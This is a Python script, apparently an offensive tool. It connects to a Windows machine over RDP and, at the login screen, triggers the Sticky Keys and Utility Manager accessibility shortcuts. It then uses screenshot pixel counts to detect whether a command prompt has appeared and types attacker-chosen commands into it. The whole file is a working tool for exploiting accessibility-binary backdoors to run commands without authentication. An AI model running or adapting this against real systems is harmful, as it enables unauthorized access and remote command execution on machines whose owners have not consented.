import argparse
import rle
import numpy
from rdpy.protocol.rdp import rdp
from twisted.internet import reactor
from PIL import Image
import rdpy.core.log as log
from datetime import datetime, timedelta

#set log level
log._LOG_LEVEL = log.Level.ERROR

class MyRDPFactory(rdp.ClientFactory):
    def __init__(self, reactor, width, height, commands, save):
        self.width = width
        self.height = height
        self.reactor = reactor
        self.commands = commands
        self.save = save
        super(type(self), self).__init__()

    def clientConnectionLost(self, connector, reason):
        self.reactor.stop()

    def clientConnectionFailed(self, connector, reason):
        self.reactor.stop()

    def buildObserver(self, controller, addr):

        class MyObserver(rdp.RDPClientObserver):
            def __init__(self, controller, reactor, width, height, commands, save):
                rdp.RDPClientObserver.__init__(self, controller)
                self.initial = Image.new("RGB", (width, height))
                # methods in reverse order of run
                self.methods = [self.utilMan, self.stickyKeys]
                self.do_final = False
                self.inittimer = None
                self.endtimer = None
                self.prompttimer = None
                self.reactor = reactor
                self.commands = commands
                self.save = save

            def _scDownUp(self, code):
                # https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
                self._controller.sendKeyEventScancode(code, True)
                self._controller.sendKeyEventScancode(code, False)

            def stickyKeys(self):
                # do 9 because it will only pop one window
                for i in range(9):
                    self._scDownUp(0x2a)

            def utilMan(self):
                # windows key + u
                self._controller.sendKeyEventScancode(0x5c, True, True)
                self._controller.sendKeyEventScancode(0x16, True, False)
                self._controller.sendKeyEventScancode(0x5c, False, True)
                self._controller.sendKeyEventScancode(0x16, False, False)

            def sendString(self, string):
                for i in string:
                    self._controller.sendKeyEventUnicode(ord(unicode(i, encoding="UTF-8")), True)
                    self._controller.sendKeyEventUnicode(ord(unicode(i, encoding="UTF-8")), False)

            def onReady(self):
                """
                @summary: Call when stack is ready
                """
                pass

            def sendCommand(self, commands):
                for command in commands:
                    self.sendString(command + "\r\n")

            def checkUpdate(self):
                if datetime.now() - self.lastUpdate > timedelta(seconds=.5):
                    self.methods.pop()()
                    self.final = self.initial.copy()
                    self.do_final = True
                    self.prompttimer = self.reactor.callLater(1, self.checkPrompt)
                else:
                    self.inittimer = self.reactor.callLater(.25, self.checkUpdate)

            def countColor(self, image, color):
                ret = 0
                for i in range(image.width):
                    for j in range(image.height):
                        if image.getpixel((i,j)) == color:
                            ret += 1
                return ret

            def checkPrompt(self):
                prompt = False
                binitial = self.countColor(self.initial, (0,0,0))
                bfinal = self.countColor(self.final, (0,0,0))
                winitial = self.countColor(self.initial, (255,255,255))
                wfinal = self.countColor(self.final, (255,255,255))
                # this is "good enough"
                if wfinal == winitial: # unlikely, but possible
                    ratio = (bfinal - binitial) / float(wfinal)
                else:
                    ratio = (bfinal - binitial) / float(wfinal - winitial)
                # bi: 108, bf: 1431, wi: 753, wf: 74051
                # bi: 108, bf: 191513, wi: 753, wf: 3094
                log.debug("bi: {}, bf: {}, wi: {}, wf: {}".format(binitial, bfinal, winitial, wfinal))
                if ratio > 10:
                    prompt = True
                    log.info("Prompt detected")
                    self.sendCommand(self.commands)
                else:
                    log.warning("No prompt")

                if not self.methods or prompt:
                    self.reactor.callLater(.5, self._controller.close)
                    return

                log.debug("Trying next method: " + self.methods[-1].__name__)
                self.inittimer = None
                self.lastUpdate = None
                self.do_final = False
                self.initial = self.final.copy()
                del self.final
                self._scDownUp(0x01)

            def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
                """
                @summary: Notify bitmap update
                @param destLeft: xmin position
                @param destTop: ymin position
                @param destRight: xmax position because RDP can send bitmap with padding
                @param destBottom: ymax position because RDP can send bitmap with padding
                @param width: width of bitmap
                @param height: height of bitmap
                @param bitsPerPixel: number of bit per pixel
                @param isCompress: use RLE compression
                @param data: bitmap data
                """
                if isCompress:
                    if bitsPerPixel < 24:
                        sz = 2
                    elif bitsPerPixel < 32:
                        sz = 3
                    else:
                        sz = 4
                    buf = bytearray(width * height * sz)
                    rle.bitmap_decompress(buf, width, height, data, sz)
                    data = bytes(buf)


                i = Image.frombytes("RGB", (width, height), data, 'raw', 'BGR;16')

                self.lastUpdate = datetime.now()
                if not self.inittimer:
                    self.inittimer = self.reactor.callLater(.1, self.checkUpdate)

                if self.do_final:
                    self.final.paste(i, (destLeft, destTop))
                else:
                    self.initial.paste(i, (destLeft, destTop))


            def onSessionReady(self):
                """
                @summary: Windows session is ready
                """
                pass

            def onReady(self):
                log.debug("Session ready")

            def onClose(self):
                """
                @summary: Call when stack is close
                """
                if self.save:
                    self.initial.save("initial.bmp")
                    self.final.save("final.bmp")
                log.debug("closed")


        controller.setScreen(self.width, self.height);
        controller.setSecurityLevel(rdp.SecurityLevel.RDP_LEVEL_SSL)
        return MyObserver(controller, self.reactor, self.width, self.height, self.commands, self.save)

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument("-i", "--ip", required=True, help="IP to connect to")
    ap.add_argument("-p", "--port", type=int, default=3389, help="Port to connect to")
    ap.add_argument("-s", "--save", action='store_true', help="Store initial and final bmp images")
    ap.add_argument("commands", nargs="+", default="", help="The command to run if you get a shell")
    args = ap.parse_args()
    reactor.connectTCP(args.ip, args.port, MyRDPFactory(reactor, 1024, 800, args.commands, args.save))
    reactor.run()
